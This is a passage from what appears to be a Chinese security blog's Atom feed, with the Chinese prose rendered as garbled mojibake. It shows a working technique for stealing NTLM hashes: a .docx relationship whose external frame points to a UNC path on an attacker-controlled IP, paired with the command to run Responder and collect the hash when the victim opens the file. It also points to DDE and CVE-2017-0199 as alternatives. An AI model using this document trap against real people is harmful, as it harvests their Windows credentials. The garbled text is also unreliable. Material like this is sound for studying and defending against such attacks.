class="tag">&lt;<span class="name">Relationship</span> <span class="attr">Id</span>=<span class="string">"rId1"</span> <span class="attr">Type</span>=<span class="string">"http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame"</span> <span class="attr">Target</span>=<span class="string">"\\172.16.103.130\Updates.docx"</span> <span class="attr">TargetMode</span>=<span class="string">"External"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Relationships</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>åœ¨è¿™é‡ŒåŒ…å«äº†UNCè·¯å¾„ã€‚æŒ‡å‘æˆ‘ä»¬çš„Responderã€‚</p><p>ä¹‹åæŠŠæ–‡æ¡£é‡æ–°å‘½åä¸ºdocxã€‚å¼€å¯Responder<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0 -wrf</span><br></pre></td></tr></table></figure></p><p>æ‰“å¼€wordï¼Œåˆ™å¯è·å–åˆ°hash</p><p><img src="https://evi1cg.github.io/usr/uploads/2017/12/2707838865.png" alt="1513737175195.png"></p><p>å½“ç„¶ï¼Œä½¿ç”¨DDEçš„æ–¹å¼ä»¥åŠCVE-2017-0199ç­‰å…¶ä»–çš„æ–¹å¼éƒ½æ˜¯å¯ä»¥çš„ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¹‹å‰æœ‰äººæ€»ç»“äº†å¾ˆå¤šç§çªƒå–NTLM hashçš„æ–¹æ³•ï¼Œ&lt;a href=&quot;https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/&quot; target=&quot;_blank&quot; rel
      
    
    </summary>
    
      <category term="å¥‡æŠ€æ·«å·§" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
    
      <category term="gethash" scheme="https://evi1cg.github.io/tags/gethash/"/>
    
      <category term="office" scheme="https://evi1cg.github.io/tags/office/"/>
    
  </entry>
  
</feed>
